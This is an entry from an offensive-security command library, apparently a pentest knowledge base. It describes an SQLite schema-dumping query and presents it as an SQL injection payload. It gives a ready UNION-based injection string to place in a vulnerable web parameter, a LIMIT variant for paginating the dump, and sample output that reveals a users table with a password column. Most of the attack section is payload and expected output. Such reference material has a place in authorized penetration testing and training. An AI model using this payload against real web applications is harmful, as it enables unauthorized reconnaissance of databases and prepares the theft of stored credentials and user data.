---
id: f9c05dc7-00b6-441e-b8bc-4e89a071563e
name: sqlite-select-schema-sql
type: command
executor: sql
data: SELECT sql FROM sqlite_schema
output: null
created_at: '2023-04-06T03:56:36.966386+00:00'
updated_at: '2023-04-10T20:24:32.303572+00:00'
platforms:
  - Web
tags:
  - sql-injection
  - sqlite
verified: true
validated: true
---

# sqlite-select-schema-sql

## Command

```sql
SELECT sql FROM sqlite_schema;
```

## Description

This SQL command queries the `sqlite_schema` system table in an SQLite database to retrieve the SQL statements used to create all tables, indexes, triggers, and views. It is typically used as a payload in SQL injection attacks to dump the database structure for reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sql | The column containing CREATE statements | Built-in |
| sqlite_schema | System table holding schema metadata | Built-in |

No user parameters; this is a fixed query for injection payloads.

## Examples

### Basic Usage

```sql
SELECT sql FROM sqlite_schema;
```

Inject into a vulnerable web parameter, e.g., `' UNION SELECT sql FROM sqlite_schema --`.

### Limited Output

```sql
SELECT sql FROM sqlite_schema LIMIT 5;
```

Use to paginate results if the full dump is large.

## Expected Output

A list of CREATE statements, such as:

```
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT);
CREATE INDEX idx_username ON users(username);
CREATE TABLE logs (timestamp DATETIME, action TEXT);
```

Success is indicated by readable SQL definitions without syntax errors.

## Related

- [[procedures/SQLite-Schema-Extraction-via-Injection]]
- [[techniques/Exploitation of Remote Services|T1210]]
